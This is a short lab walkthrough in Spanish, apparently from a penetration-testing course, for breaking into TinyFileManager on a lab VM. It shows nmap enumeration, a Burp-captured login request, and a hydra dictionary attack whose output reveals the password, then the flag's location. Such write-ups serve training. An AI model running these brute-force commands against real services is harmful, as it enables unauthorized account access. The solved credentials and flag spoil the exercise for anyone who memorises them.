
# Walk: Password Attacks - SSH and RDP - VM #4
## Fecha: 20/02/2025
## Host: Ubuntu
## IP: 192.168.232.201
## Objetivo
Follow the steps from this section to gain access to TinyFileManager on VM #1 (BRUTE). Once logged in, find the flag.
## Herramientas
1. nmap
2. Burp
3. hydra
## Procedimiento y comandos
#### Paso 1: Escanemos el host para enumerar servicios:
- `nmap -sV --open 192.168.232.201 -oN vm-4.nmap-result.txt `
```
Nmap scan report for 192.168.232.201
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    PHP cli server 5.5 or later
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.39 seconds
```
#### Obtenemos con Burp la cabecera:
- Hacemos un intento de login con el interceptor activado:
```
POST / HTTP/1.1
Host: 192.168.232.201
Content-Length: 23
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.232.201
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.232.201/
Accept-Encoding: gzip, deflate, br
Cookie: filemanager=ftrtp34rggraebkb9ru8aa6v82
Connection: keep-alive
fm_usr=test&fm_pwd=test
```
#### Paso 2: Ejecutamos el ataque de diccionario con hydra:
> Probamos el usuario generico de TinyFileManager: **user**
- `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.232.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-20 11:59:04
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.232.201:80/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 16 active
[80][http-post-form] host: 192.168.232.201   login: user   password: 121212
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-20 12:01:52

```
- [80][http-post-form] host: 192.168.232.201   login: user   password: **121212**
#### Paso 3: Iniciamos sesion con usuario/user, password/121212:
- El flag esta en el archivo **install.txt**
